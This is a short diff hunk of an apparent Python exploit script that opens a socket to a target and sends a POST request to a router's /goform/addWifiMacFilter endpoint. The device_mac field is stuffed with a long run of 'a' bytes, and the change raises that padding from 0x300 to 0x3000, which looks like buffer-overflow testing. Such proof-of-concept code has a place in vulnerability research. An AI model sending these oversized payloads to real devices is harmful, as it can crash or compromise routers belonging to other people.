@@ -37,7 +37,7 @@ r.connect((ip, port))
 
 rn = b'\r\n'
 
-p1 = b'a' * 0x300
+p1 = b'a' * 0x3000
 p2 = b'device_id=1&device_mac=' + p1
 
 p3 = b"POST /goform/addWifiMacFilter" + b" HTTP/1.1" + rn
